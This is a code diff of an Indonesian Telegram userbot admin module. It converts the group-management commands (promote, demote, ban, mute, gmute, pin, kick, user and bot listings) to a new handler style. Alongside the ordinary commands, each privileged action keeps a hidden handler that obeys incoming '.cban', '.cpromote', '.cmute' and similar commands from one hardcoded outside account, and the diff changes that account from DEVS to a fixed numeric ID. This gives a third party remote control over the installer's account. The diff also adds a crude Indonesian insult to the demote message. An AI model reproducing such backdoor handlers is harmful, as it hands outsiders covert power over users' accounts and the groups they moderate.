@@ -29,9 +29,8 @@ from telethon.tl.types import (
     MessageMediaPhoto,
     PeerChat,
 )
-from userbot import CMD_HANDLER as cmd
-from userbot.utils import ram_cmd
-from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, DEVS
+
+from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP
 from userbot.events import register
 
 # =================== CONSTANT ===================
@@ -78,7 +77,7 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 # ================================================
 
 
-@ram_cmd(pattern="setgpic$")
+@register(outgoing=True, pattern=r"^\.setgpic$")
 async def set_group_photo(gpic):
     if not gpic.is_group:
         await gpic.edit("`Mohon Lakukan Perintah Ini Di Grup.`")
@@ -114,8 +113,8 @@ async def set_group_photo(gpic):
             await gpic.edit(PP_ERROR)
 
 
-@ram_cmd(pattern="promote$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote$")
+@register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cpromote$")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
@@ -165,8 +164,8 @@ async def promote(promt):
         )
 
 
-@ram_cmd(pattern="demote$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote$")
+@register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cdemote$")
 async def demote(dmod):
     # Admin right check
     chat = await dmod.get_chat()
@@ -177,7 +176,7 @@ async def demote(dmod):
         return await dmod.edit(NO_ADMIN)
 
     # If passing, declare that we're going to demote
-    await dmod.edit("`Otw Hapus Admin dulu ges...`")
+    await dmod.edit("`Otw Hapus Babu dulu ges...`")
     rank = "Admin"  # dummy rank, lol.
     user = await get_user_from_event(dmod)
     user = user[0]
@@ -201,7 +200,7 @@ async def demote(dmod):
     # Assume we don't have permission to demote
     except BadRequestError:
         return await dmod.edit(NO_PERM)
-    await dmod.edit("`Admin Berhasil Dilepas! Makanya Jangan semena mena tolol`")
+    await dmod.edit("`Admin Berhasil Dilepas! Makanya Kalo Jadi Admin Jangan semena mena yah ngentod sebagai`")
     await sleep(5)
     await dmod.delete()
 
@@ -215,8 +214,8 @@ async def demote(dmod):
         )
 
 
-@ram_cmd(pattern="ban$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cban$")
+@register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cban$")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -269,8 +268,8 @@ async def ban(bon):
         )
 
 
-@ram_cmd(pattern="unban$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban$")
+@register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cunban$")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -281,7 +280,7 @@ async def nothanos(unbon):
     if not admin and not creator:
         return await unbon.edit(NO_ADMIN)
 
-    # If everything goes well...
+    # If everything goes well... No
     await unbon.edit("`Kita Unban gess, Kasian...`")
 
     user = await get_user_from_event(unbon)
@@ -306,8 +305,8 @@ async def nothanos(unbon):
         await unbon.edit("`Sepertinya Terjadi Kesalahan!`")
 
 
-@ram_cmd(pattern="mute$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute$")
+@register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cmute$")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -361,8 +360,8 @@ async def spider(spdr):
             return await spdr.edit("`Terjadi Kesalahan!`")
 
 
-@ram_cmd(pattern="unmute$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute$")
+@register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cunmute$")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -438,8 +437,8 @@ async def muter(moot):
             await moot.delete()
 
 
-@ram_cmd(pattern="ungmute$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute$")
+@register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cungmute$")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -481,8 +480,8 @@ async def ungmoot(un_gmute):
             )
 
 
-@ram_cmd(pattern="gmute$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute$")
+@register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
+@register(incoming=True, from_users=1779447750, pattern=r"^\.cgmute$")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
@@ -522,8 +521,8 @@ async def gspider(gspdr):
             )
 
 
-@ram_cmd(pattern="zombies$", groups_only=False)
-async def _(show):
+@register(outgoing=True, pattern=r"^\.zombies(?: |$)(.*)", groups_only=False)
+async def rm_deletedacc(show):
 
     con = show.pattern_match.group(1).lower()
     del_u = 0
@@ -590,7 +589,7 @@ async def _(show):
         )
 
 
-@ram_cmd(pattern="admins$")
+@register(outgoing=True, pattern=r"^\.admins$")
 async def get_admin(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
@@ -609,7 +608,7 @@ async def get_admin(show):
     await show.edit(mentions, parse_mode="html")
 
 
-@ram_cmd(pattern="pin$")
+@register(outgoing=True, pattern=r"^\.pin(?: |$)(.*)")
 async def pin(msg):
     # Admin or creator check
     chat = await msg.get_chat()
@@ -653,7 +652,7 @@ async def pin(msg):
         )
 
 
-@ram_cmd(pattern="kick$")
+@register(outgoing=True, pattern=r"^\.kick(?: |$)(.*)")
 async def kick(usr):
     # Admin or creator check
     chat = await usr.get_chat()
@@ -694,8 +693,8 @@ async def kick(usr):
         )
 
 
-@ram_cmd(pattern="users$")
-async def users(show):
+@register(outgoing=True, pattern=r"^\.users ?(.*)")
+async def get_users(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
     mentions = "Pengguna Di {}: \n".format(title)
@@ -784,8 +783,8 @@ async def get_user_from_id(user, event):
     return user_obj
 
 
-@ram_cmd(pattern="userdel$")
-async def usersdel(show):
+@register(outgoing=True, pattern=r"^\.usersdel ?(.*)")
+async def get_usersdel(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
     mentions = "Akun Terhapus Di {}: \n".format(title)
@@ -876,8 +875,8 @@ async def get_userdel_from_id(user, event):
     return user_obj
 
 
-@ram_cmd(pattern="bots$", groups_only=True)
-async def bots(show):
+@register(outgoing=True, pattern=r"^\.bots$", groups_only=True)
+async def get_bots(show):
     info = await show.client.get_entity(show.chat_id)
     title = info.title if info.title else "Grup Ini"
     mentions = f"<b>Daftar Bot Di {title}:</b>\n"
@@ -914,32 +913,32 @@ async def bots(show):
 
 CMD_HELP.update(
     {
-        f"admin": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}promote` <username/balas ke pesan> <nama title (optional)>"
-        f"\n↳ : Mempromosikan member sebagai admin."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}demote` <username/balas ke pesan>"
-        f"\n↳ : Menurunkan admin sebagai member."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}ban` <username/balas ke pesan> <alasan (optional)>"
-        f"\n↳ : Memblokir Seseorang."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}unban <username/reply>`"
-        f"\n↳ : Menghapus Blokir."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}mute` <username/balas ke pesan> <alasan (optional)>"
-        f"\n↳ : Membisukan Seseorang Di Grup, Bisa Ke Admin Juga."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}unmute` <username/balas ke pesan>"
-        f"\n↳ : Membuka bisu orang yang dibisukan."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}gmute` <username/balas ke pesan> <alasan (optional)>"
-        f"\n↳ : Membisukan ke semua grup yang kamu punya sebagai admin."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}ungmute` <username/reply>"
-        f"\n↳ : Reply someone's message with `.ungmute` to remove them from the gmuted list."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}zombies`"
-        f"\n↳ : Untuk mencari akun terhapus dalam grup."
-        f"Gunakan `.zombies clean` untuk menghapus Akun Terhapus dari grup."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}all`"
-        f"\n↳ : Tag semua member dalam grup."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}admins`"
-        f"\n↳ : Melihat daftar admin di grup."
-        f"\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}bots`"
+        "admin": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.promote` <username/balas ke pesan> <nama title (optional)>"
+        "\n↳ : Mempromosikan member sebagai admin."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.demote` <username/balas ke pesan>"
+        "\n↳ : Menurunkan admin sebagai member."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.ban` <username/balas ke pesan> <alasan (optional)>"
+        "\n↳ : Memblokir Seseorang."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.unban <username/reply>`"
+        "\n↳ : Menghapus Blokir."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.mute` <username/balas ke pesan> <alasan (optional)>"
+        "\n↳ : Membisukan Seseorang Di Grup, Bisa Ke Admin Juga."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.unmute` <username/balas ke pesan>"
+        "\n↳ : Membuka bisu orang yang dibisukan."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gmute` <username/balas ke pesan> <alasan (optional)>"
+        "\n↳ : Membisukan ke semua grup yang kamu punya sebagai admin."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.ungmute` <username/reply>"
+        "\n↳ : Reply someone's message with `.ungmute` to remove them from the gmuted list."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.zombies`"
+        "\n↳ : Untuk mencari akun terhapus dalam grup."
+        "Gunakan `.zombies clean` untuk menghapus Akun Terhapus dari grup."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.all`"
+        "\n↳ : Tag semua member dalam grup."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.admins`"
+        "\n↳ : Melihat daftar admin di grup."
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.bots`"
         "\n↳ : Melihat daftar bot dalam grup."
-        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}users` Atau >`.users` <nama member>"
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.users` Atau >`.users` <nama member>"
         "\n↳ : Mendapatkan daftar pengguna daam grup."
-        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `{cmd}setgpic` <balas ke gambar>"
+        "\n\n𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.setgpic` <balas ke gambar>"
         "\n↳ : Mengganti foto profil grup."})
